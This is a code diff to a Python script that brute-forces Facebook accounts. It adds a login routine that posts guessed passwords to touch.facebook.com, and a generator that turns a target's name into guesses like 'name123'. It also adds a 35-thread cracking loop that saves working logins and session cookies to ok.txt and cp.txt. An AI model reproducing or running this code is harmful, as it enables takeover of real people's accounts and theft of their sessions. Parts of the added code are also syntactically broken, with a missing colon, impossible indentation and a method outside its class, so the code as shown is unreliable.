@@ -204,7 +204,7 @@ def choose_menu():
     elif r=="3":
 	likers()
     elif r=="4":
-	crack()
+	crackez()
     elif r=="0":
 	try:
 		os.system('rm -rf login.txt')
@@ -327,6 +327,55 @@ def likers():
 	except Exception as e:
 		exit("   [•] Error : %s"%e)
 
+def crackez():
+	os.system("clear")
+  	banner()
+  	print("\n   [ Choose Methose Crack ]")
+  	print("\n   [1] Crack With mbasic")
+  	print("   [2] Crack With m.facebook.com")
+  	pmc=raw_input("\n   [•] Choose : ")
+  	if pmc=="":
+		print("   [!] Fill In The Correct")
+		crackez()
+  	elif pmc=="1":
+    		fastcrack()
+  	elif pmc=="2":
+    		crack()
+  	else:
+    		print("   [!] Fill In The Correct")
+		crackez()
+		
+def touch_fb(em,pas,hosts):
+	global ua,touch_fbh
+	r=requests.Session()
+	r.headers.update(touch_fbh)
+	p=r.get("https://touch.facebook.com/")
+	b=bs4.BeautifulSoup(p.text,"html.parser")
+	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
+	data={}
+	for i in b("input"):
+		if i.get("value") is None:
+			if i.get("name")=="email":
+				data.update({"email":em})
+			elif i.get("name")=="pass":
+				data.update({"pass":pas})
+			else:
+				data.update({i.get("name"):""})
+		else:
+			data.update({i.get("name"):i.get("value")})
+	data.update(
+		{"fb_dtsg":meta,"m_sess":"","__user":"0",
+		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
+		}
+	)
+	r.headers.update({"referer":"https://touch.facebook.com/login/?next&ref=dbl&fl&refid=8"})
+	po=r.post("https://touch.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
+	if "c_user" in r.cookies.get_dict().keys():
+		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
+	elif "checkpoint" in r.cookies.get_dict().keys():
+		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
+	else:return {"status":"error","email":em,"pass":pas}#touch fb		
+		
 def mbasic(em,pas,hosts):
 	global ua,mbasic_h
 	r=requests.Session()
@@ -358,6 +407,22 @@ def mbasic(em,pas,hosts):
 		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
 	else:return {"status":"error","email":em,"pass":pas}#crack mbasic
 
+def gene(text):
+	results=[]
+	global ips
+	for i in text.split(" "):
+		if len(i)<3:
+			continue
+		else:
+			i=i.lower()
+			if len(i)==3 or len(i)==4 or len(i)==5:
+				results.append(i+"123")
+				results.append(i+"12345")
+			else:
+				results.append(i+"123")
+				results.append(i+"12345")
+	return results	
+	
 def generate(text):
 	results=[]
 	global ips
@@ -401,6 +466,61 @@ def logs():
     print("   [!] Fill In The Correct")
     logs()
 
+class fastcrack:
+	os.system("clear")
+        banner()
+	try:
+		while True:
+			try
+				self.apk=raw_input("\n   [•] ID List File : ")
+				self.fs=open(self.apk).read().splitlines()
+				break
+			except Exception as e:
+				print ("   %s"%e)
+				continue
+					self.fl=[]
+					for i in self.fs:
+						try:
+							self.fl.append({"id":i.split("<=>")[0],"pw":gene(i.split("<=>")[1])})
+						except:continue
+				except Exception as e:
+					print ("   %s"%e)
+			print ("   [•] Crack Started...")
+			print ("   [•] Account [OK] Saved to : ok.txt")
+			print ("   [•] Account [CP] Saved to : cp.txt\n")
+			ThreadPool(35).map(self.main1,self.fl)
+			os.remove(self.apk)
+			print("\n\x1b[0;37m   [•] Finished")
+			break
+			
+def main1(self,fl):
+		try:
+			for i in fl.get("pw"):
+				log=touch_fb(fl.get("id"),
+					i,"https://touch.facebook.com")
+				if log.get("status")=="success":
+					print("\r\x1b[0;32m   [OK] %s • %s               "%(fl.get("id"),i))
+					self.ada.append("%s|%s"%(fl.get("id"),i))
+					if fl.get("id") in open("ok.txt").read():
+						break
+					else:
+						open("ok.txt","a+").write(
+						"%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies"))))
+					ko="%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
+					break
+				elif log.get("status")=="cp":
+					print("\r\x1b[0;33m   [CP] %s • %s               "%(fl.get("id"),i))
+					self.cp.append("%s|%s"%(fl.get("id"),i))
+					open("cp.txt","a+").write(
+						"%s|%s|\n"%(fl.get("id"),i))
+					break
+				else:continue
+					
+			self.ko+=1
+			print "\r\x1b[0;37m   [Crack] %s/%s - ok-:%s - cp-:%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
+		except:
+			self.main1(fl)
+	
 class crack:
         os.system("clear")
         banner()
